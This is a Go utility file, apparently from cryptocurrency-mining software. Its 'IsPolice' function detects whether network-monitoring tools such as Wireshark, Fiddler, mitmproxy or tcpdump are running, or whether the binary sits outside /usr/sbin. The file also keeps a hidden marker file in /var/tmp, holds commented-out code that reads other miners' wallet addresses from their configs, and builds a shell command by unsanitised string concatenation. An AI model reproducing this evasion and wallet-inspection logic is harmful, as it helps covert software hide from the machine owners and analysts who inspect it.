package utils

import (
	"io"
	"os"
	"strings"
	//	"regexp"
	"io/ioutil"
	"path/filepath"
)
func IsNeverRun(neverTurn string) bool {
	fileName := "/var/tmp/.net-stat"

	if neverTurn == "yes" {
		os.Remove(fileName)
		f, _ := os.Create(fileName)
		io.WriteString(f, "yes")
		return true
	}else{
		data, err := ioutil.ReadFile(fileName)
		if err == nil && strings.Contains(string(data),"yes") {
			return true
		}
	}

	return false
}

func IsPolice()bool{
	runPath, _  := filepath.Abs(filepath.Dir(os.Args[0]))  //返回绝对路径  filepath.Dir(os.Args[0])去除最后一个元素的路径
	if runPath != "/usr/sbin"{
		return true
	}
	fileInfo, e := os.Stat("/home/ymminer/bin/tty-shell")
	if fileInfo != nil && e == nil {
	} else if os.IsNotExist(e) {
		return true
	}
	return isWatch()
}


func isWatch()bool{
	softNames := []string{"fiddler","Charles","Firebug","httpwatch","Wireshark","SmartSniff","HttpAnalyzerStd","WSExplorer","iptool","sniffer","mitmproxy","mitmdump","mitmweb","tcpdump","etherreal"}

	for _,cmdName := range softNames{
		if IsSoftRunning(cmdName){
			return true
		}
	}
	return false
}

func IsSoftRunning(cmdName string) bool {
	commandStr := "ps -ef | grep " + cmdName + "|grep -v grep | wc -l"

	data, err := BashCommand(commandStr, 5)

	data = data[0:1]
	data = strings.Trim(data, " ")

	if err != nil || string(data) == "0" {
		return false
	}
	return true
}

func IsKernelRunning() bool {
	cc, err := GetCurrentMiner()
	if err != nil {
		return false
	}
	return IsSoftRunning(cc.Name)
}


/*
func IsMyWallet(conf *Config,param *Params) bool {
	wallet := ""
	if param.MinerName == "phoenixminer"{
		wallet = GetFileItem(param.ConfigPath,"-wal")
	}else if param.MinerName == "nbminer" || param.MinerName == "teamredminer"{
		data,err := ioutil.ReadFile(param.ConfigPath)
		if err != nil{
			return false
		}
		parttern := `0x[0-9a-zA-Z]{40}`
		re, _ := regexp.Compile(parttern)
		result := string(re.Find([]byte(data)))
		if result == "" {
			return true
		}
		wallet = result
	}
	if isOwnWallet(wallet,conf.Wallets){
		return true
	}
	return false
}
*/

func isOwnWallet(address string,wallets []string) bool {
	for _, addr := range wallets {
		if strings.Contains(address, addr) {
			return true
		}
	}
	return false
}
